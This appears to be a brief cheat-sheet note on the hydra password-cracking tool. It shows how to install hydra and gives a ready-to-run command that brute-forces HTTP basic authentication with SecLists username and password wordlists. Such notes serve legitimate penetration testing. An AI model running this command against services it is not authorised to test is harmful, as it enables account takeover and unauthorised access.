[hydra](https://github.com/vanhauser-thc/thc-hydra) is a CLI (and GUI) tool for cracking the authentication of a service.

# Installation

```
sudo apt-get install hydra hydra-gtk
```

# Example usage

You can get the username and password lists from [SecLists](https://github.com/danielmiessler/SecLists).

## HTTP basic authentication

```
hydra -t 16 -s 443 -S -V \
-m https://{$FQDN}/ ${FQDN} https-get \
-L github/SecLists/Usernames/top-usernames-shortlist.txt \
-P github/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt
```

To supply a single username or password: 

* `-l <someusername>`
* `-p <somepassword>`
